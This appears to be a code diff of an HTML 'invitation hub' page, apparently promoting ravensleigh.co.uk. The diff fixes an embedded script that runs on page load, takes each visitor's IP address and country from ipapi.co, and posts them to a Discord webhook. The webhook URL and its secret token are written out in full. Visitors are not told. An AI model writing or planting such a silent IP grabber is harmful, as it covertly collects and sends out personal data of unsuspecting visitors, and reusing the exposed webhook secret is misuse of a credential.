@@ -4,37 +4,39 @@
   <meta charset="UTF-8">
   <title>The NEW invitation hub!</title>
   <meta name="description" content="Invite users world wide to anywhere! Use ravensleigh.co.uk TODAY!">
-  <script>
-   <script>
+</head>
+<body>
+
+<h1>This page is currently for testing only. There is no reason for you to be here.</h1>
+
+<script>
 let userCountry = null;
 let userIP = null;
 
 fetch("https://ipapi.co/json/")
   .then(response => response.json())
   .then(data => {
-    userCountry = data.country_name; // e.g. "United Kingdom"
-    userIP = data.ip;               // e.g. "203.0.113.45"
-  
-const webhookURL = "https://discord.com/api/webhooks/1467501807830831154/RuLUs4ffAq2ipEK0fTTzh0QoM0UzLjQOxgObSn3dZ3S3Ll3nnnNmQlihK_l6Kt2b2RzP";
+    userCountry = data.country_name;
+    userIP = data.ip;
 
- Your variable
-fetch(webhookURL, {
-  method: "POST",
-  headers: {
-    "Content-Type": "application/json"
-  },
-  body: JSON.stringify({
-content: `New visitor! \n Country: ${userCountry}\nIP: ${userIP}`
+    const webhookURL = "https://discord.com/api/webhooks/1467501807830831154/RuLUs4ffAq2ipEK0fTTzh0QoM0UzLjQOxgObSn3dZ3S3Ll3nnnNmQlihK_l6Kt2b2RzP";
 
+    return fetch(webhookURL, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        content: `New visitor!\nCountry: ${userCountry}\nIP: ${userIP}`
+      })
+    });
   })
-});
-});
+  .catch(error => {
+    console.error("Failed to fetch IP data:", error);
+  });
+</script>
 
-    
-    
-  </script>
-</head>
-<body>
-  <h1> This page is currently for testing only. There is no reason for you to be here.</h1>
 </body>
 </html>
+</html>
+
